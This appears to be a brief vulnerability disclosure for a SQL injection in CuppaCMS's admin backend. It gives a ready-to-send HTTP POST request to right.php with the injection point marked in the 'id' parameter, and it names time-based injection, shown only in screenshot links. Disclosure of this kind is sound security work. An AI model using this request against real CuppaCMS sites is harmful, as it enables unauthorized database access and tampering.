# CuppaCMS-SQL Injecttion

 后台存在SQL注入 <br>
 注入参数 <b>id</b>SQL injection exists in the background
 ## POST
 POST /templates/default/html/windows/right.php HTTP/1.1<br>
 X-Requested-With: XMLHttpRequest<br>
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36<br>
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br>
 <br>
 id=*&url=components%2Ftable_manager%2Fhtml%2Fedit_admin_table.php&path=component%2Ftable_manager%2Fview%2Fcu_views&uniqueClass=window_right_1860693<br>
 ## 延时注入
 ![image](https://github.com/tangzhaosong/Excavate/assets/100182502/38deaee9-17b8-42d7-8862-99f0eaa51de4)

![image](https://github.com/tangzhaosong/Excavate/assets/100182502/37dcde04-2f7c-4cb8-b27f-3f6a7d64c383)

 
 ![image](https://github.com/tangzhaosong/Excavate/assets/100182502/4d3baf53-d41b-4b79-b494-cc5e1286a24e)
 
 ![image](https://github.com/tangzhaosong/Excavate/assets/100182502/77513a6b-6bc1-4ee9-99ad-ff32bf4ea9e4)

